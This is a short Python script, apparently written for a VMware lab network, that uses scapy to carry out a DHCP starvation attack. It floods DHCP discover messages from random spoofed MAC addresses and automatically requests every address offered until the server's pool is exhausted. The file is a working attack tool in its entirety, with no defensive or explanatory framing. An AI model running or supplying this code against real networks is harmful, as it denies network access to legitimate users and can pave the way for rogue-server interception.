import binascii
import _thread
from scapy.all import *


def sent_discover(threadName, delay):
    # 生成随机ID
    xid_random = random.randint(1, 90000000)
    # 生成随机MAC地址
    mac_random = str(RandMAC())
    # 修改MAC地址格式
    client_mac_id = binascii.unhexlify(mac_random.replace(':', ''))
    print("random mac is:" + mac_random+"\n")
    dhcp_discover = Ether(src=mac_random, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(
        sport=68, dport=67) / BOOTP(chaddr=client_mac_id, xid=xid_random) / DHCP(
        options=[("message-type", "discover"), "end"])
    #iface为网卡名称
    sendp(dhcp_discover, iface='VMware Network Adapter VMnet9')
    print("sending DHCPDISCOVER on your Ether!\n")


def sniffer_discover(threadName, delay):
    def detect_dhcp(pkt):
        if DHCP in pkt:
            if pkt[DHCP].options[0][1] == 2:
                Ether_Request = Ether(src=pkt[Ether].dst, dst="ff:ff:ff:ff:ff:ff")
                IP_Request = IP(src="0.0.0.0", dst="255.255.255.255")
                UDP_request = UDP(sport=68, dport=67)
                BOOTP_Request = BOOTP(chaddr=pkt[BOOTP].chaddr, xid=pkt[BOOTP].xid)
                DHCP_Request = DHCP(options=[("message-type", 'request'), ("server_id", pkt[DHCP].options[1][1]),
                                             ("requested_addr", pkt[BOOTP].yiaddr), "end"])
                Requst = Ether_Request / IP_Request / UDP_request / BOOTP_Request / DHCP_Request
                sendp(Requst, iface='VMware Network Adapter VMnet9')
                print(pkt[BOOTP].yiaddr + "--> requesting...waiting...\n")
            if pkt[DHCP].options[0][1] == 5:
                print(pkt[BOOTP].yiaddr + "--> ok...got a IP...\n")

    sniff(filter="src port 67", iface='VMware Network Adapter VMnet9', prn=detect_dhcp, count=10)


while 1:
    _thread.start_new_thread(sniffer_discover, ("Thread-1", 0,))
    _thread.start_new_thread(sent_discover, ("Thread-2", 10,))

